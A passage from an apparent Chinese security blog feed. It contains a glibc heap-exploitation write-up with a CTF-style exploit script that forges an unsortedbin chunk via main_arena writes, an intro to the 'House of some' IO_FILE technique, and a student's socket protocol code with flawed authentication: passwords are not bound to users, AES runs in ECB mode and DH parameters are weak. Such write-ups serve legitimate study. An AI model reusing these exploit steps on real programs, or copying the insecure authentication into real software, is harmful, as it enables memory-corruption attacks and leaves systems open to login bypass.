就会往ptr_addr写入unsortedbin的链表头地址 配合io链就可以覆写IO_list_all 从而伪造io结构体 劫持程序执行流<br>但是在2.31以后 作者优化了对unsortedbin chunk的链表检查 在不修改main_arena的情况下 已经无法实现任意地址写了 在后续的步骤3中 我将说明如何通过修改main_arena来实现任意地址申请的逻辑漏洞<br>回到源代码中 如果要申请的chunk大小等于链表中的chunk大小 会先将符合要求的chunk转移到tcachebin中(如果对应链表尚有空闲) 随后在第二次执行时 由于链表已经为空不进入while循环 直接从tcachebin中申请chunk<br>如果大小不一致 会根据unsortedbin中的chunk大小来判断要将chunk放入largebin还是smallbin 随后再进行分配</p><p>如果想要伪造一个fake chunk加入unsortedbin链表 并且实现利用realloc函数把这个fake chunk申请出来 就需要更改链表头chunk的bk域<br>接下来 需要更改这个fake chunk的fd域 让其指向main_arena 同时要做好伪造 修改fake chunk的size域 以及其物理相邻的下一个chunk的chunk头信息也要做好伪造<br>做好这些前置工作 还需要绕过的判断就是 如何不进入while循环 只要我们没有完善链表结构 程序就会一直认为 链表中还存在chunk 就一直遍历 报错是必然发生的事<br>想要把fake chunk从链表中脱离出来 要解决的关键就是如下这个check</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim = unsorted_chunks (av)-&gt;bk  </span><br><span class="line">bck = victim-&gt;bk;  </span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构  </span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))  </span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);  </span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av) </span><br></pre></td></tr></table></figure><p>Victim指向fake chunk   bck指向fake chunk的bk域<br>需要使得bck的fd域指向fake chunk 还需要使得fake chunk指向main_arena<br>看似很容易满足 但是关键是下次进入while循环时 victim就会指向bck<br>如果此时bck的bk域不等于main_arena 就会重新进入while循环 那么此时bck的链表结构又需要重新布置 并且进入死循环<br>但是实际上这是不可能的 除非我们去申请的是main_arena 但是这仍然需要我们拥有更改main_arena的权限 这样才能绕过size和prevsize的检查<br>那么既然必须更改main_arena 有没有更容易的篡改方案 首先把fake chunk的bk域改为指向unsorted_chunks(av) 那么while循环的check就可以绕过去了<br>接下来则是需要绕过bck-&gt;fd &#x3D;&#x3D; victim这一条判断<br>使得unsorted_chunks(av)指向victim 即修改main_arena+96+0x10处为vitcim</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bss_addr = elf.bss(0x300)</span><br><span class="line">add(0x500,&quot;aaaa&quot;)#0</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#1</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#2</span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">heap_addr = u64(io.recv(5).ljust(8,b&#x27;\x00&#x27;))&lt;&lt;12</span><br><span class="line">success(&quot;heap_addrr :&quot;+hex(heap_addr))</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x1f2ce0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#3</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#4</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#5</span><br><span class="line"></span><br><span class="line">add(0x500,&quot;aaaa&quot;)#6</span><br><span class="line">add(0x10,&quot;aaaa&quot;)#7</span><br><span class="line">delete(6)</span><br><span class="line">payload = p64(libc_addr + 0x1f2ce0)+p64(bss_addr)</span><br><span class="line"></span><br><span class="line">edit(6,len(payload),payload)</span><br><span class="line">any_write(p64(bss_addr+0x8),p64(0x30)+p64(heap_addr+0x7e0)+p64(libc_addr+0x1f2ce0))</span><br><span class="line">payload = p64(0x30)+p64(0x20)</span><br><span class="line">any_write(p64(bss_addr+0x30),payload)</span><br><span class="line">any_write(p64(libc_addr+0x1f2ce0+0x10),p64(bss_addr))</span><br><span class="line">gdb.attach(io,&#x27;b *malloc+10&#x27;)</span><br><span class="line">add(0x20,&quot;aaaa&quot;)#8</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202412202230980.png" alt="image.png"></a><br>可以成功的把伪造的fake chunk申请出来<br>为了实现这一次非法内存申请 需要泄露heap地址以及libc地址<br>修改unsortedbin chunk的bk域<br>修改fake chunk的size域 fd域 bk域 以及其next chunk的prev_size和size域<br>修改main_arena+96+0x10处为fake chunk<br>由此可见glibc2.35对于unsortedbin的检查十分严格 我们需要对内存空间有极大的可控制性才能绕过check</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>House of some</title>
    <link href="http://example.com/2024/11/19/house-of-some/"/>
    <id>http://example.com/2024/11/19/house-of-some/</id>
    <published>2024-11-19T05:59:23.000Z</published>
    <updated>2024-11-19T06:32:21.487Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文的目的不单单在于学习house of some这条链的利用手法 而是借此机会 了解清楚关于io file这块利用的原理<br>house of some是在house of apple2的基础上进一步优化的链 所需的条件更加精简 而且已有大佬编写了自动化利用的库 在比赛抢血或者节省时间中有更大的优势<br>原文地址:<a href="https://blog.csome.cc/p/house-of-some/">https://blog.csome.cc/p/house-of-some/</a></p><h1 id="IO-File"><a href="#IO-File" class="headerlink" title="IO_File"></a>IO_File</h1><p>io结构体的定义位于&#x2F;libio&#x2F;bits&#x2F;types&#x2F;struct_FILE.h中<br><a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/bits/types/struct_FILE.h#L49">https://elixir.bootlin.com/glibc/glibc-2.31/source/libio/bits/types/struct_FILE.h#L49</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct _IO_FILE</span><br><span class="line">&#123;</span><br><span class="line">  int _flags;        /* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="line"></span><br><span class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</span><br><span class="line">  char *_IO_read_ptr;    /* Current read pointer */</span><br><span class="line">  char *_IO_read_end;    /* End of get area. */</span><br><span class="line">  char *_IO_read_base;    /* Start of putback+get area. */</span><br><span class="line">  char *_IO_write_base;    /* Start of put area. */</span><br><span class="line">  char *_IO_write_ptr;    /* Current put pointer. */</span><br><span class="line">  char *_IO_write_end;    /* End of put area. */</span><br><span class="line">  char *_IO_buf_base;    /* Start of reserve area. */</span><br><span class="line">  char *_IO_buf_end;    /* End of reserve area. */</span><br><span class="line"></span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</span><br><span class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</span><br><span class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  struct _IO_marker *_markers;</span><br><span class="line"></span><br><span class="line">  struct _IO_FILE *_chain;</span><br><span class="line"></span><br><span class="line">  int _fileno;</span><br><span class="line">  int _flags2;</span><br><span class="line">  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */</span><br><span class="line"></span><br><span class="line">  /* 1+column number of pbase(); 0 is unknown. */</span><br><span class="line">  unsigned short _cur_column;</span><br><span class="line">  signed char _vtable_offset;</span><br><span class="line">  char _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">#ifdef _IO_USE_OLD_IO_FILE</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在同一进程中的io结构体 通过chain成员连接在一起 类似于单向链表<br>初始会载入三个结构体 stdin stdout stderr</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="heap" scheme="http://example.com/categories/heap/"/>
    
    
  </entry>
  
  <entry>
    <title>安全协议设计过程</title>
    <link href="http://example.com/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/"/>
    <id>http://example.com/2024/10/11/%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B/</id>
    <published>2024-10-11T09:58:59.000Z</published>
    <updated>2024-11-22T13:17:59.675Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><p>安全协议的目的就是传输数据 并且实现两个基础目标 安全性和可靠性 前者指数据不会被泄露 后者指数据不会被篡改<br>所以数据的传输过程 可以归类于四个阶段<br>“发”  “传“ ”收“ ”验“<br>发送阶段 需要对数据进行加密<br>这里有两种思路 一种是使用对称加密 还有一种是选择非对称加密 从安全性上 个人更倾向使用后者<br>传输阶段 这里打算使用socket来负责两个设备之间的通讯 同时还需要考虑进行身份验证 防止非法用户传输<br>接受阶段 为了防止攻击者使用过量的数据来瘫痪通讯 也许需要加入过滤机制来接受数据 这一点考虑到实现的复杂 是否加入还有待考虑<br>验证阶段 需要对接受到的数据进行检测 以防止数据被篡改或者是传输不完整</p><h1 id="传输阶段的一些尝试"><a href="#传输阶段的一些尝试" class="headerlink" title="传输阶段的一些尝试"></a>传输阶段的一些尝试</h1><p>对于socket的使用并不是非常熟练 打算先通过一些简单的交互来加深一下<br>本机的ubuntu虚拟机同时充当客户端和服务端  使用python语言编写</p><h2 id="v0-1"><a href="#v0-1" class="headerlink" title="v0.1"></a>v0.1</h2><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket() #创建套接字 默认使用TCP协议</span><br><span class="line">s.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">s.listen(5) #最多连接5个客户端</span><br><span class="line">print(&quot;等待连接中&quot;)</span><br><span class="line">while 1:</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    print(sock,addr)</span><br><span class="line">    while 1:</span><br><span class="line">        text = sock.recv(1024) #接受的最大字节数为1024</span><br><span class="line">        if len(text.strip()) == 0:</span><br><span class="line">            print(&quot;服务端接收到客户端的数据为空&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;收到客户端发送的数据为：&#123;&#125;&quot;.format(text.decode()))</span><br><span class="line">            content = input(&quot;请输入发送给客户端的信息：&quot;)</span><br><span class="line">            sock.send(content.encode())</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">print(&quot;成功连接&quot;)</span><br><span class="line">while 1:</span><br><span class="line">    data = input(&quot;需要向服务端传输的数据 :&quot;)</span><br><span class="line">    s.send(data.encode())</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    print(&quot;服务端发送的数据为:&#123;&#125;&quot;,format(text))</span><br></pre></td></tr></table></figure><p>实现效果<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301530.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301530.png" alt="image.png"></a><br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301497.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202410211301497.png" alt="image.png"></a></p><h1 id="身份验证的实现"><a href="#身份验证的实现" class="headerlink" title="身份验证的实现"></a>身份验证的实现</h1><p>目前思考的是采用哪种身份验证方案<br>一种是采用第三方验证 比如auth0 这种的虽然实现起来更加高级且安全<br>第二种就是只需要做到安全的密钥交换 然后采用静态的用户密码库存储(也可以更换成sql) 然后加密传输用户名密码即可<br>考虑到第一种方法工作量太大 而且实现起来复杂(其实就是不会得边学边写) 还是乖乖采用第二种方法吧<br>这里采用dh算法 来实现在不安全的通讯中传输共享密钥  获得到共享密钥后 使用aes加密算法来加密用户名和密码<br>暂时是通过静态的用户名和密码库来实现身份验证 同时这里还存在一个攻击漏洞 对于密码的检测是遍历密码库中的所有密码 有满足的即可 并没有检验是否对应该用户</p><h2 id="v0-2"><a href="#v0-2" class="headerlink" title="v0.2"></a>v0.2</h2><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import math</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def Authentication(sock,shared_key):</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    decrypted_username = aes.decrypt(username)</span><br><span class="line">    username = (unpad(decrypted_username, 16)).decode()</span><br><span class="line">    if username in users:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        if password in passwds:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            return</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            exit()</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(&quot;等待连接中&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        Authentication(sock,shared_key)</span><br><span class="line">        while 1:</span><br><span class="line">            text = sock.recv(1024) #接受的最大字节数为1024</span><br><span class="line">            if len(text.strip()) == 0:</span><br><span class="line">                print(&quot;服务端接收到客户端的数据为空&quot;)</span><br><span class="line">            else:</span><br><span class="line">                print(f&quot;收到客户端发送的数据为：&#123;text.decode()&#125;&quot;)</span><br><span class="line">                content = input(&quot;请输入发送给客户端的信息：&quot;)</span><br><span class="line">                sock.send(content.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import math</span><br><span class="line">import random</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;进行身份验证&quot;)</span><br><span class="line">    key = shared_key[:16]  # 确保密钥长度符合要求（256 位）</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    username_bytes = pad(username.encode(&#x27;utf-8&#x27;), AES.block_size)</span><br><span class="line">    encrypt_username = aes.encrypt(username_bytes)</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        password_bytes = pad(password.encode(&#x27;utf-8&#x27;),AES.block_size)</span><br><span class="line">        encrypt_password = aes.encrypt(password_bytes)</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 0xB7E4DE6A253A6E3A1F7F6E2A8F9FBA6E8C6F1A8F9C7D7F7AA6A3E1E9B7EAE4E8C6F7F6B7E4D6E8C6A3E2E9E8F9F7E5E8C2D1E8F8C6D2E5A1F5E2A5E8D8C5D8A5E5B7A5F5A8D7A5F1E5B4D5A1</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        data = input(&quot;需要向服务端传输的数据 :&quot;)</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        print(f&quot;服务端发送的数据为:&#123;text&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>针对账号密码的问题 进行了一波优化<br>使用sqlite3模块和sql数据库配合使用  实现账号密码的校验<br>暂时只打算把注册账号的权限给admin用户 在权限校验这块还存在问题 使用的是username的检测 严谨一点的应该加入数据库的参数 这样方便后面更改用户的操作权限<br>这一版大致优化了一些交互 不过还是很简陋 预计后面要增加窗口化界面<br>同时目前最关键的问题是 dh算法的g参数 我还没去跑出来一个较大的数 还是使用的2</p><h2 id="v0-3"><a href="#v0-3" class="headerlink" title="v0.3"></a>v0.3</h2><p>服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import math</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">users = [&#x27;user1&#x27;,&#x27;user2&#x27;,&#x27;user3&#x27;]</span><br><span class="line">passwds = [&#x27;aaaa&#x27;,&#x27;bbbb&#x27;,&#x27;cccc&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_server):</span><br><span class="line">    print(&quot;开始进行公钥交换&quot;)</span><br><span class="line">    sock,addr = s.accept()</span><br><span class="line">    public_key_client = sock.recv(1024)</span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(</span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client),sock,addr</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode()</span><br><span class="line">    return data</span><br><span class="line">    </span><br><span class="line">def Authentication(sock,shared_key,cursor):</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">    result = cursor.fetchone()</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        print(&quot;用户名正确&quot;)</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE password = ?&quot;, (password,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            print(&quot;密码正确&quot;)</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1</span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0</span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            exit()</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;&quot;&quot;</span><br><span class="line">    菜单选项:</span><br><span class="line">    1. 传输文本数据</span><br><span class="line">    2. 传输附件</span><br><span class="line">    3. 注册新用户</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt():</span><br><span class="line">    #还没写</span><br><span class="line">    return</span><br><span class="line">def transfer_file():</span><br><span class="line">    #还没写</span><br><span class="line">    return</span><br><span class="line">def register(permission_value,sock,shared_key,cursor):</span><br><span class="line">    if permission_value == 0:</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :</span><br><span class="line">        sock.send(&quot;输入注册用户名&quot;.encode())</span><br><span class="line">        username = (sock.recv(1024))</span><br><span class="line">        username = decrypt_data(shared_key,username)</span><br><span class="line">        sock.send(&quot;输入密码&quot;.encode())</span><br><span class="line">        password = sock.recv(1024)</span><br><span class="line">        password = decrypt_data(shared_key,password)</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    # 创建 DH 参数对象</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    public_key_client,sock,addr = key_switch(s,public_key_server)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(&quot;等待连接中&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print(sock,addr)</span><br><span class="line">        print(&quot;开始进行身份验证&quot;)</span><br><span class="line">        permission_value = Authentication(sock,shared_key,cursor)</span><br><span class="line">        while 1:</span><br><span class="line">            menu(sock)</span><br><span class="line">            choice = (sock.recv(1024)).decode()</span><br><span class="line">            if choice == &quot;1&quot;:</span><br><span class="line">                transfer_txt()</span><br><span class="line">            elif choice == &quot;2&quot;:</span><br><span class="line">                transfer_file()</span><br><span class="line">            elif choice == &quot;3&quot;:</span><br><span class="line">                register(permission_value,sock,shared_key,cursor)</span><br><span class="line">            else:</span><br><span class="line">                sock.send(&quot;输入的选项错误 请重新输入&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == 